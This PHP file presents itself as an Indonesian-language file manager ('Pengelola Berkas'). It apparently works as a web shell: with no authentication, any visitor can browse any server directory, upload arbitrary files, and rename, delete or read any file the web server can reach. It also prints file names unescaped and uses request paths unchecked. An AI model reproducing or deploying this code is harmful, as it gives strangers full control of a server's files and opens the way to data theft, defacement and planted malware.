<?php
function x($string) {
    return htmlspecialchars($string, ENT_QUOTES, 'UTF-8');
}

function formatSize($bytes) {
    if ($bytes >= 1073741824) {
        return number_format($bytes / 1073741824, 2) . ' GB';
    } elseif ($bytes >= 1048576) {
        return number_format($bytes / 1048576, 2) . ' MB';
    } elseif ($bytes >= 1024) {
        return number_format($bytes / 1024, 2) . ' KB';
    } else {
        return $bytes . ' B';
    }
}

function getIcon($path) {
    return is_dir($path) ? '📁' : '📄';
}

$currentPath = isset($_GET['d']) ? $_GET['d'] : getcwd();
if (!is_dir($currentPath)) {
    $currentPath = getcwd();
}

if (isset($_POST['upload'])) {
    $targetFile = $currentPath . DIRECTORY_SEPARATOR . $_FILES['uploaded_file']['name'];
    if (move_uploaded_file($_FILES['uploaded_file']['tmp_name'], $targetFile)) {
        echo "<script>alert('File berhasil diunggah!');</script>";
    } else {
        echo "<script>alert('Gagal mengunggah file!');</script>";
    }
}

if (isset($_POST['create_folder'])) {
    $folderName = $_POST['folder_name'];
    if ($folderName && mkdir($currentPath . DIRECTORY_SEPARATOR . $folderName)) {
        echo "<script>alert('Folder berhasil dibuat!');</script>";
    } else {
        echo "<script>alert('Gagal membuat folder!');</script>";
    }
}

if (isset($_POST['rename'])) {
    $oldPath = $_POST['rename_path'];
    $newName = $_POST['new_name'];
    $newPath = dirname($oldPath) . DIRECTORY_SEPARATOR . $newName;
    if (rename($oldPath, $newPath)) {
        echo "<script>alert('Nama berhasil diubah!');</script>";
    } else {
        echo "<script>alert('Gagal mengubah nama!');</script>";
    }
}

if (isset($_POST['delete_path'])) {
    $deletePath = $_POST['delete_path'];
    if (is_dir($deletePath)) {
        rmdir($deletePath);
    } else {
        unlink($deletePath);
    }
    echo "<script>alert('Berhasil dihapus!');</script>";
}

if (isset($_GET['view'])) {
    $viewPath = $_GET['view'];
    if (is_file($viewPath)) {
        header('Content-Type: text/plain');
        readfile($viewPath);
        exit;
    }
}

?><!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Pengelola Berkas</title>
    <style>
        body {
            background-color: #001f3f;
            color: #ffffff;
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
        }
        #container {
            background-color: rgb(0, 0, 0);
            padding: 20px;
            margin: 10px;
            border-radius: 10px;
        }
        table {
            width: 100%;
            border-collapse: collapse;
            margin-top: 10px;
        }
        th, td {
            text-align: left;
            padding: 10px;
        }
        table, th, td {
            border: 1px solid #66b2ff;
            color: #ffffff;
        }
        th {
            background-color:rgb(0, 0, 0);
        }
        tr:nth-child(even) {
            background-color: #0066cc;
        }
        tr:nth-child(odd) {
            background-color: rgb(0, 0, 0);
        }
        a {
            color: #66b2ff;
            text-decoration: none;
        }
        a:hover {
            text-decoration: underline;
        }
        .actions button {
            margin-right: 5px;
            background-color: #66b2ff;
            color: #001f3f;
            border: none;
            padding: 5px 10px;
            cursor: pointer;
            border-radius: 5px;
        }
        .actions button:hover {
            background-color: #3399ff;
        }
    </style>
</head>
<body>
    <div id="container">
        <h2>Pengelola Berkas 📂</h2>
        <div>
            <?php
            $breadcrumbs = explode(DIRECTORY_SEPARATOR, $currentPath);
            $breadcrumbPath = '';
            foreach ($breadcrumbs as $dir) {
                $breadcrumbPath .= $dir . DIRECTORY_SEPARATOR;
                echo '<a href="?d=' . urlencode($breadcrumbPath) . '">' . x($dir) . '</a> / ';
            }
            ?>
        </div>
        <form method="POST" enctype="multipart/form-data">
            <input type="file" name="uploaded_file">
            <button type="submit" name="upload">Upload 🚀</button>
        </form>
        <form method="POST">
            <input type="text" name="folder_name" placeholder="Nama Folder">
            <button type="submit" name="create_folder">Buat Folder 🗂️</button>
        </form>
        <table>
            <tr>
                <th>Nama</th>
                <th>Permission</th>
                <th>Ukuran</th>
                <th>Aksi</th>
            </tr>
            <?php
            $files = scandir($currentPath);
            foreach ($files as $file) {
                if ($file !== '.' && $file !== '..') {
                    $fullPath = $currentPath . DIRECTORY_SEPARATOR . $file;
                    $permissions = substr(sprintf('%o', fileperms($fullPath)), -4);
                    $size = is_file($fullPath) ? formatSize(filesize($fullPath)) : 'Folder';
                    $icon = getIcon($fullPath);

                    echo "<tr>
                            <td>$icon <a href='?d=" . urlencode($fullPath) . "'>$file</a></td>
                            <td>$permissions</td>
                            <td>$size</td>
                            <td class='actions'>
                                <form method='POST' style='display:inline;'>
                                    <input type='hidden' name='rename_path' value='" . x($fullPath) . "'>
                                    <input type='text' name='new_name' placeholder='Nama Baru'>
                                    <button type='submit' name='rename'>✏️</button>
                                </form>
                                <form method='POST' style='display:inline;'>
                                    <input type='hidden' name='delete_path' value='" . x($fullPath) . "'>
                                    <button type='submit'>❌</button>
                                </form>";
                    if (is_file($fullPath)) {
                        echo "<a href='?view=" . urlencode($fullPath) . "'><button type='button'>👁️</button></a>";
                    }
                    echo "</td>
                          </tr>";
                }
            }
            ?>
        </table>
    </div>
</body>
</html>
